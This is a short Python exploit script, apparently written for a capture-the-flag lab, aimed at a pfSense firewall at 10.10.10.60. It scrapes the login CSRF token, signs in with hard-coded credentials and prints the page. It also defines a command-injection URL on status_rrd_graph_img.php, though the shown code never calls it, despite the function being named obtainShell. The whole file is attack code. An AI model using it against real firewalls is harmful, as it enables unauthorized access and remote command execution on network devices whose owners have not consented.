#!/usr/bin/python

import requests, urllib3, threading, time, os, re, sys
from pwn import *

# Variables globales
main_url = "https://10.10.10.60/index.php"
rce_url = "https://10.10.10.60/status_rrd_graph_img.php?database=queues;"

def obtainShell():

    s = None

    try:
        # No verificamos el certificado autofirmado
        urllib3.disable_warnings()
        s = requests.session()
        s.verify = False
        s.keep_alive = False

        r = s.get(main_url)

        csrf_magic = re.findall(r'__csrf_magic\' value="(.*?)"',r.text)[0]

        login_data = {
            '__csrf_magic':'%s' % (csrf_magic),
            'usernamefld': 'rohit',
            'passwordfld' : 'pfsense',
            'login' : 'Login', 
        }

        r = s.post(main_url, data=login_data)
        r = s.get(main_url)
        print (r.text)

    except:
        print("[*] Error")
        sys.exit()


if __name__ == '__main__':
    obtainShell()

